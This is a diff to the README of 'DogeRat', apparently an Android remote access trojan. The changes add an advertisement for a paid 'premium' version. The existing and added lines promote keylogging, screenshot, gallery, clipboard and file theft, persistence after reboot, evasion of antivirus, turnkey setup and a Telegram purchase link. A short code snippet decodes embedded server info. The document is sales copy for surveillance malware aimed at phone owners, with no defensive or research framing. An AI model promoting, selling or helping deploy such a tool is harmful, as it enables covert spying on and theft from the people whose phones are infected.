@@ -34,6 +34,33 @@
 - 🔐 Keylogger {Availbe in apk v1 and v2}
 - ✨ Beautiful telegram bot interface
 -🤖 Undetectable by antivirus
+
+
+
+<h2 align="center"> ✨ WE ARE SELLING DOGERAT PREMIUM  VERSION ✨ </h2>
+<h5 align="center">♦️ MORE POWERFULL- MORE STABLE -MORE FEATURES ♦️</h5>
+
+- 🕉️ DogeRat Premium Subscription Available 🕉️
+- ⭐️ New Features ⭐️
+- 🕉️ Screenshot
+- 🕉️ Keylogger
+- 🕉️ Gallery
+- 🕉️ Clipboard
+- 🕉️New File Manager 
+-------------------------
+- And many features,check in video 
+- 🕉️ New features Added
+- 🕉️ Bug fixed
+- 🕉️ Persistence (work after removing from background or restarting the phone
+- 🕉️ Smooth connection client to Bot
+- 🕉️ We provide full setup, you don't need to do anything
+
+ <p align="center">
+  <a href="https://t.me/shivaya_dav/">
+    <img src="https://img.shields.io/badge/📹%20BUY%20NOW-brightgreen?style=for-the-badge" alt="♦️ BUY NOW ♦️" />
+  </a>
+  
+  -------------------------
 <h2>Requirements</h2>
 <ul>
   <li><span style="color: #0074D9;">APK EDITOR</span></li>
@@ -132,7 +159,7 @@ To build the application in Android Studio, follow these steps:
 fun getAppData(): AppData {
     val data = "<your encoded server info>"
     val text = decode(data)
-    return Gson().fromJson(text, AppData::class.java)
+    return json().fromJson(text, AppData::class.java)
 }
 ```
 
@@ -200,6 +227,7 @@ fun getAppData(): AppData {
     <img src="https://reporoster.com/stars/dark/shivaya-dav/DogeRat" alt="Stargazers" title="Stargazers" width="400" height="auto">
   </a>
   
+  -------------------------
   <a href="https://github.com/shivaya-dav/DogeRat/network/members">
     <img src="https://reporoster.com/forks/dark/shivaya-dav/DogeRat" alt="Forkers" title="Forkers" width="400" height="auto">
   </a>
